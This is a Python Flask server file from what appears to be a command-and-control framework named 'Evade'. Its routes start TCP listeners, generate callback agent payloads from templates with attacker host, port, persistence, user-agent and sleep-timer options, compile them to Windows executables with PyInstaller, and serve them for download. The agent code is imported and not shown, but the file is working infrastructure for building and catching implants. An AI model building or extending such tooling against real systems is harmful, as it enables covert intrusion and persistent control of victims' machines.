from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import subprocess
import uuid
import os
import logging
import threading
# Import agent template functions
from agent_templates import tcp_agent_template, http_agent_template, https_agent_template
from tcp_server import start_tcp_server


app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})

app.config['UPLOAD_FOLDER'] = r"E:\\Github\\Repos\\Evade-A-C2-Framework\\COMPELTE\\generated_payloads"
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

@app.route('/api/configure-listener', methods=['POST'])
def configure_listener():
    data = request.get_json()
    protocol = data.get('protocol')
    port = int(data.get('port'))
    localIP = data.get('localIP')
    if not protocol or not port:
        return jsonify({'error': 'Missing required fields'}), 400
    if protocol.lower()=='tcp':
        try:
            thread = threading.Thread(target=start_tcp_server, args=(localIP, port))
            thread.daemon = True
            thread.start()
            return jsonify({'message': 'TCP server started'}), 200
        except Exception as e:
            return jsonify({'error': f'Failed to start TCP listener: {str(e)}'}), 500
    if protocol.lower()=='http':
        #start_http_server()
        pass
    if protocol.lower()=='https':
        #start_https_server()
        pass

    print({'message': f'Listener configured for {protocol} on {localIP} port {port}'})
    return jsonify({'message': f'Listener configured for {protocol} on {localIP} port {port}'}), 200
    

@app.route('/download/<filename>')
def download_payload(filename):
    try:
        # Log the requested filename for download
        print(f"Requested filename for download: {filename}")

        # Securely join the filename to the uploads folder
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        print(f"Constructed filepath: {filepath}")

        # Check if the file exists
        if not os.path.exists(filepath):
            print(f"File not found: {filepath}")  # Changed to print for visibility in console
            return jsonify({"error": "File not found"}), 404

        # Print the directory and filename being sent
        print(f"Sending file from directory: {app.config['UPLOAD_FOLDER']} with filename: {filename}")

        # Use send_from_directory with the corrected parameters
        return send_from_directory(directory=app.config['UPLOAD_FOLDER'], path=filename, as_attachment=True)
    except Exception as e:
        # Print the exception if the file download fails
        print("Failed to download file:", e)
        return jsonify({"error": "Internal server error"}), 500

@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.get_json()
    print(data)
    required_fields = ["name", "lhost", "lport", "type", "protocol", "persistence"]
    if not all(field in data for field in required_fields):
        return jsonify({"error": "Missing required fields"}), 400
    print("----------------------------------------------")
    print("Sabai chha")
    print("----------------------------------------------")

    # Extract parameters
    name, lhost, lport, payload_type, protocol, persistence = (
        data["name"], data["lhost"], data["lport"], data["type"], data["protocol"], data["persistence"]
    )

    userAgent = data.get("userAgent", "")
    sleepTimer = data.get("sleepTimer", "")
    print("----------------------------------------------")
    print(name, lhost, lport, payload_type, protocol, persistence, userAgent, sleepTimer )
    print("----------------------------------------------")

    # Choose the appropriate template function and prepare parameters
    if protocol == "tcp":
        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence)
    elif protocol == "http":
        try:
            print(f"Handling {protocol.upper()} protocol")
            print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
            
            if not all(param in data for param in ["userAgent", "sleepTimer"]):
                return jsonify({"error": "Missing required HTTP fields"}), 400
            print("----------------------------------------------")
            print("Sabai chha data haru")
            print("----------------------------------------------")
            # Use the HTTP agent template function
            agent_code = http_agent_template(
                lhost=lhost, 
                lport=lport, 
                persistence=persistence, 
                userAgent=userAgent, 
                sleepTimer=sleepTimer
            )

            print(agent_code)
        except Exception as e:
            # Log the exception or print for debugging
            print(f"Error generating HTTP agent: {e}")
            # Return a response indicating an internal error occurred
            return jsonify({"error": "An error occurred while generating the HTTP agent", "details": str(e)}), 500

    elif protocol == "https":
        print(f"Handling {protocol.upper()} protocol")
        print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
        
        if not all(param in data for param in ["userAgent", "sleepTimer"]):
            return jsonify({"error": "Missing required HTTPS fields"}), 400

        # Use the HTTPS agent template function
        agent_code = https_agent_template(
            lhost=lhost, 
            lport=lport, 
            persistence=persistence, 
            userAgent=data['userAgent'], 
            sleepTimer=data['sleepTimer']
        )

    else:
        return jsonify({"error": "Invalid protocol specified"}), 400



    print("----------------------------------------------")
    print("Filename ma pugyo")
    print("----------------------------------------------")
    # Save the generated code to a file
    filename = f"{name}_{str(uuid.uuid4())}{'.py' if payload_type == '.py' else '.exe'}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    with open(filepath, 'w') as file:
        file.write(agent_code)

    # Compile to .exe if needed
    if payload_type == '.exe':
        try:
            subprocess.run(['pyinstaller', '--onefile', '--distpath', app.config['UPLOAD_FOLDER'], '--name', filename, filepath], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to compile .exe file: {e}")
            return jsonify({"error": "Failed to compile .exe file"}), 500

    download_url = f"http://{request.host}/download/{filename}"
    return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})

if __name__ == "__main__":
    app.run(debug=True, port=5002)
